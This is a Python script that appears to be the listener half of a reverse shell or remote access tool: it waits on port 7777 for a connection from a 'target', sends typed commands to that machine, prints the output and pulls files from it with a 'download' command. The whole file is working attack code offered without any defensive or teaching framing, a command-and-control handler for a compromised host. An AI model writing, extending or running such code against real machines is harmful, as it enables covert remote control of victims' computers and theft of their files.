import socket as st
from os import system
from sys import exit

def command_injection(cmd:str,client):
    try:
        client.send(cmd.encode())
        getout = client.recv(1024).decode().strip()
    
    except Exception as err:
        return err
    
    return getout


sock = st.socket(st.AF_INET,st.SOCK_STREAM)
sock.setsockopt(st.SOL_SOCKET,st.SO_REUSEADDR,1)
sock.bind(('127.0.0.1',7777))
sock.listen()
con,addr = sock.accept()

# def recv_file()
while con:
    system('clear')
    print('[*] Connection established to the target')

    while True:
        cmd = input('>>>')
        if not cmd:
            continue

        elif 'download' in cmd:
            con.send(cmd.encode())
            getfile_name = cmd.split(maxsplit=1)[1]
            try:
                with open(getfile_name,'wb') as file:
                    while True:
                        fetch_file = con.recv(8192)
                        if not fetch_file:
                            break
                        file.write(fetch_file)
                print('file recieved...')
                file.close()
            except Exception as e:
                print(e)

        elif cmd in ('quite','exit'):
            con.close()
            sock.close()
            break

        else:
            con.send(cmd.encode())
            output = con.recv(1168).decode()
            print(output,end='\n',flush=True)
            continue
